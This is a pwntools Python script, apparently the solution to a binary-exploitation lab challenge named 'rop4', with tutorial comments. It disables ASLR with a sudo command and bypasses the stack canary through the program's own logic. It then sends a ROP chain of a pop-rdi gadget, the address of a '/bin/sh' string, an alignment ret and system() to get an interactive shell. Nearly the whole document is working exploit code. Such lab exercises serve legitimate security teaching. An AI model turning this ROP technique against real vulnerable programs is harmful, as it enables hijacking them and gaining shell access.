# WARNING: requires the command 'echo 0 | sudo tee /proc/sys/kernel/randomize_va_space' to be exectued

from pwn import *

# the following command opens a new terminal in tmux with gdb attached to the process;
# this is useful in the first phase of debugging

# context.terminal = ["tmux", "splitw", "-h"]

# the following line tells to the pwntools library to print debug messages;
# in particular, sent / received messages will be printed

context.log_level = "debug"

# it is suggested to first analyse the binary with gdb, and only after to craft and
# directly send the payload

# p = gdb.debug('../target/rop4', '''b *pwnme+145
# c
# ''')
p = process('../target/rop4')

# the command 'p system' reveals the address of the 'system' function

system_addr = 0x7ffff7a31550

# insert the string "/bin/sh" as our name and find its address with gdb

p.recvline()
p.sendline(b'/bin/sh')
bin_sh_addr = 0x404080

# we need a ROP gadget to set the argument of the 'system' function
# the pwntools library has what is needed

elf = ELF('../target/rop4')
rop = ROP(elf)

gadget_addr = rop.rdi[0] # pop rdi: ret

# "jump" over the canary exploiting the logic of the program

for i in range(10):
    p.recvuntil(b':')
    p.sendline(b'12')

# finally, assemble the ROP chain

p.recvuntil(b':')
p.sendline(str(gadget_addr)) # gadget
p.recvuntil(b':')
p.sendline(str(bin_sh_addr)) # /bin/sh
p.recvuntil(b':')
p.sendline(str(0x000000000040126f)) # additional 'ret' to align the stack
p.recvuntil(b':')
p.sendline(str(system_addr)) # system
p.recvuntil(b':')
p.sendline(b'0')
p.interactive()
